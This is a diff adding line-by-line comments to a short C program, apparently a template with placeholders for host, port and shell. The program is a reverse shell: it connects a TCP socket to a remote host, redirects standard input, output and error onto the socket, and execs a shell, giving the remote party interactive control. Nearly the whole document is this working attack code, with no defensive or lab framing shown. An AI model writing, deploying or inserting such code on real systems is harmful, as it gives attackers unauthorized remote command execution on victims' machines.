@@ -3,27 +3,31 @@
 #include <arpa/inet.h>
 
 int main() {
+    // Create a TCP socket
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock == -1) {
         exit(1);
     }
 
+    // Prepare the sockaddr_in structure with the target address
     struct sockaddr_in server_addr;
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(|\port|);
-    inet_pton(AF_INET, "|\host|", &server_addr.sin_addr);
+    server_addr.sin_family = AF_INET;                     // Use IPv4
+    server_addr.sin_port = htons(|\port|);                // Set the port, in network byte order
+    inet_pton(AF_INET, "|\host|", &server_addr.sin_addr); // Convert IP address to binary format
 
+    // Attempt to connect to the remote host
     if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1) {
         close(sock);
         exit(1);
     }
 
+    // Redirect standard input, output, and error to the socket
     dup2(sock, 0);
     dup2(sock, 1);
     dup2(sock, 2);
 
+    // Replace the current process with a shell
     execl("|\shell|", "|\shell|", NULL);
 
     close(sock);
-    return 0;
 }
